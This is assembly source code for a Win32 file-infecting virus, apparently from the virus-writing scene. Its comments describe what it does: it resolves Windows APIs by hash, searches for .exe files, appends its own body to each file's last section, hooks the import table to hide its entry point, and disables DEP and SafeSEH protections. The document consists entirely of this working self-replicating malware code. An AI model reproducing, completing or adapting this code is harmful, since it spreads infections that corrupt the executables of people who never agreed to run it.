.486
.model  flat, stdcall
.code   hh86
include dnl12.inc
publicz dnl12_exe
        push    rExitProcess
        pushad
        push    PEB
        pop     esi
        xor     edx, edx
        call    a1
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     fs:[eax]
        pop     eax
        popad
        ret
a1:     push    fs:[edx]
        mov     fs:[edx], esp
        lods    dword ptr fs:[esi]
        mov     eax, [eax]
        org     $ - 1
        inc     eax
        db      e_lfanew - PEB
        mov     esi, dword ptr [eax + InMemoryOrderModuleList_Flink]
        lodsd
        mov     eax, [eax]
        mov     ebp, [eax][off_k]
        call    a2
        dd      0efc7ea74h
        dd      02519b15ah
        dd      0391ab6afh
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0b09315f4h
        db      0
a2:     pop     esi

;===========================================================================
;walk lists
;===========================================================================

import_next:
        mov     eax, dword ptr [ebp + IMAGE_DIRECTORY_ENTRY_EXPORT - IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
        mov     ebx, [ebp][eax]
        org     $ - 2
        db      5ch
        db      28h
        db      e_lfanew * 2
        add     ebx, ebp
 
export_next:
        mov     edi, [ebx]
        org     $ - 1
        db      7bh
        db      20h
        add     edi, ebp
        mov     edi, dword ptr [edi][edx * 4]
        stc
        sbb     eax, eax
        add     edi, ebp
        crc32
        not     eax
        cmp     [esi], eax
        je      resolve
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     export_next
        int     3

;===========================================================================
;resolve API address
;=====
;find exe files
;use enter to reduce stack a few dwords. ebp completes and align
;===========================================================================

resolve:
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     edi, ebp
        movzx   edi, word ptr [edi]
        org     $ - 1
        db      e_lfanew
        db      57h
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     eax, ebp
        mov     eax, [eax]
        x       = 4
        org     $ - 1
        db      x
        mov     eax, x
        org     $ - x
        add     eax, ebp
        push    eax
        lodsd
        cdq
        cmp     byte ptr [esi], cl              ;db - CL not DL
        jne     import_next
        push    esp
        pop     esi
        enter   sizeof WIN32_FIND_DATA - sizeof IMAGE_DOS_HEADER.e_magic, 0 
        mov     edi, esp
        push    'e'
        push    'xe.*'
        mov     ecx, esp
        push    edi
        push    ecx
        call    esFindFirstFileA
        xchg    ebp, eax
        xor     ebx, ebx

open_file:
        pushad  
        push    ebx
        push    ebx
        push    3
        push    ebx
        push    3
        push    3
        lea     edx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        call    esCreateFileA
        push    eax
        push    eax
        push    ebx
        push    ebx
        mov     ebp, dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow]
        push    ebp
        push    eax
        push    ebx
        add     ebp, 1075h
        push    ebp
        push    ebx
        push    4
        push    ebx
        push    eax
        call    esCreateFileMappingA
        push    eax
        push    ebp
        push    ebx
        push    ebx
        push    2
        push    eax
        call    esMapViewOfFile
        push    eax
        pushad
        call    a3
        pop     eax
        pop     eax
        pop     esp

stackres:
        xor     eax, eax
        pop     fs:[eax]
        pop     eax
        popad
        call    esUnmapViewOfFile
        call    dword ptr [esi]
        call    esSetFilePointer 
        call    esSetEndOfFile 
        call    dword ptr [esi]
        popad
        push    edi
        push    ebp
        call    esFindNextFileA
        test    eax, eax
        jnz     open_file
        int     3                               ;popx2-leave

;===========================================================================
;MZ and PE\0\0
;===========================================================================

a3:     push    fs:[ebx]
        mov     fs:[ebx], esp
        push    eax
        pop     ebp
        cmp     word ptr [eax], 'ZM'
        jne     stackres
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], 'EP'
        jne     stackres
        db      83h, 0c0h, 7fh                  ;add eax, sizeof impfill - optimised import data directory offset

;===========================================================================
;32-bit machine. GUI or CUI mode
;no appended data (virmark, attribute certificates, debug info, etc)
;====
;disable DEP
;===========================================================================

        test    byte ptr [eax], 'h'
        org     $ - 2
        db      40h
        db      sizeof glosoli
        add     [eax], eax
        org     $ - 1
        jz      stackres
        mov     cl, byte ptr [eax - (sizeof impfill - IMAGE_NT_HEADERS.OptionalHeader.Subsystem)]
        dec     ecx
        dec     ecx
        cmp     cl, 1
        jnbe    stackres
        and     byte ptr [eax], 'h'
        org     $ - 2
        db      PEB shl 1
        db      sizeof impaddr
        db      0f0h
        movzx   ecx, word ptr [eax - (sizeof impfill - IMAGE_NT_HEADERS.FileHeader.NumberOfSections)]
        imul    ecx, ecx, sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + ecx + ((sizeof IMAGE_NT_HEADERS - 7fh) - sizeof IMAGE_SECTION_HEADER) + IMAGE_SECTION_HEADER.SizeOfRawData]
        mov     ecx, [esi] 
        add     ecx, [esi]
        org     $ - 1
        int     3
        org     $ - 1
        db      04eh
        db      HALFPTR
        cmp     dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow], ecx
        jne     stackres

;===========================================================================
;set size
;===========================================================================

        mov     bh, 10h
        stc                                     ;set 1-byte
        adc     dword ptr [esp + sizeof STACK_REG + 14h], ebx

;===========================================================================
;infect exe
;always append to exe files
;increase last section and image size to contain the virus code
;===========================================================================

        mov     edx, dword ptr [esi]
        add     [esi], ebx
        add     edx, [esi]
        org     $ - 1
        int     3
        org     $ - 1
        db      56h
        db      not 3
        add     dword ptr [eax - (sizeof impfill - IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)], ebx
        add     dword ptr [esi - (SECTION_ID + 4)], ebx
        lea     edi, dword ptr [ebp + ecx]
        push    ebx
        pop     ecx
        push    edi
        call    $ + 5

image_base:
        pop     esi
        sub     esi, offset image_base - offset dnl12_exe
        rep     movsb

;===========================================================================
;entrypoint obscuring
;hook first entry in bound import address table
;===========================================================================

        mov     ecx, [eax]
        org     $ - 1
        int     3
        org     $ - 1
        db      48h
        db      "a"
        mov     esi, [eax]
        org     $ - 1
        db      70h
        db      0b5h
        add     eax, 19h
        call    skip_codes
        cmp     esi, ecx
        jnb     skip_subim
        sub     ecx, esi

skip_subim:
        sub     ecx, dword ptr [eax + (sizeof IMAGE_NT_HEADERS - sizeof glosoli) + IMAGE_SECTION_HEADER.VirtualAddress]
        cmp     dword ptr [eax + 4], ecx
        org     $ - 1
        int     3
        org     $ - 1
        db      "h"
        jbe     sehscape
        add     ecx, dword ptr [eax + (sizeof IMAGE_NT_HEADERS - sizeof glosoli) + IMAGE_SECTION_HEADER.PointerToRawData]
        add     ecx, ebp
        ret

skip_codes:
        pop     ebx
        call    ebx
        cmp     dword ptr [ecx][1], 'd'
        org     $ - 1
        int     3
        org     $ - 2
        db      1ch
        db      0
        je      sehscape
        mov     ecx, [ecx]
        org     $ - 1
        int     3
        org     $ - 1
        db      49h
        db      sizeof iat_tbl
        call    ebx
        add     edx, esi
        xchg    [ecx], edx
        pop     edi
        inc     edi
        mov     [edi], edx
        lea     edi, dword ptr [eax + (0c8h - sizeof glosoli)]
        xor     eax, eax
        stosd                                   ;disable SafeSEH
        stosd

sehscape:
        int     'h' - 'e'

publicz dnl12_end      
impfill db      7fh  dup ("h")
iat_tbl db      14h  dup ("h")
glosoli db      98h  dup ("8")
impaddr db      0e0h dup ("6")
publicz dnl12_mi2
        db      1000h - ((offset dnl12_mi2 - offset dnl12_end) + (offset dnl12_end - offset dnl12_exe)) dup ("h")

publicz message
        xor     ebx, ebx
        push    ebx
        push    708h
        push    ebx
        push    ebx
        push    7
        call    skip_rain
        db      "h h 8 6"

skip_rain:
        push    STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
end     dnl12_exe
the end